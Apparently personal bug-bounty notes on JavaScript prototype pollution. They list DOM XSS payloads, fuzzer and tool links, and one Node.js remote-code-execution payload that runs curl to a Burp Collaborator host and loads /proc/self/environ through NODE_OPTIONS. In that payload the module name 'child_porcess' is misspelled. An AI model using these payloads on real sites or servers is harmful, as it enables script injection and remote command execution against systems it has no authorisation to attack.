# Prototype pollution

Prototype Pollution lead to DOM XSS

```
- proto-1
    - Data Flow -> Source -> Sink
        - Data -> u -> for -> person{}: copy
        - Source -> Sink (innerHTML))
- proto-2
    - setter function -> snippet -> Location of pollution
    - untrusted types: https://github.com/filedescriptor/untrusted-types
```

### payloads

```
__proto__[email]=<img/src%3dx onerror%3Dalert(1)>
constructor[prototype][email]=<img/src%3dx onerror%3Dalert(1)>
```

when create payload we should replace "=" with "%3d" , other wise payload not work!

### find all Dom xss ( source , sink )

```
https://domgo.at/cxss/intro
```

### showing sink in Dom

```
https://github.com/filedescriptor/untrusted-types
```

### Methodology

```
- Context/Inputs
    - Inputs: URLs -> hakrawler + logger++ 
- use fuzzer
- use debugger
```

### Fuzzer

```
    - https://github.com/kleiton0x00/ppmap
    - https://github.com/msrkp/PPScan
```

### Prototype Pollution to RCE

```
- Client-Side -> Browser -> Object Prototype
- NodeJS (Runtime Environment) -> env 
    - Context/Inputs ->  Forms, Links, ... 
    - Fuzzer -> Burp Intruder + Nuclei + Custom Script 
    - {"constructor":{"prototype": {"env": {"polluted": "require('child_porcess').exec('curl 4ty7vc7z5ybq27zso682wt7jaag04p.burpcollaborator.net')//"}, "NODE_OPTIONS": "--require /proc/self/environ"}}}
```

### Prevention

```
https://www.whitesourcesoftware.com/resources/blog/prototype-pollution-vulnerabilities/
```

#### good tools for search not for hash dom xss

```
https://github.com/kleiton0x00/ppmap
```
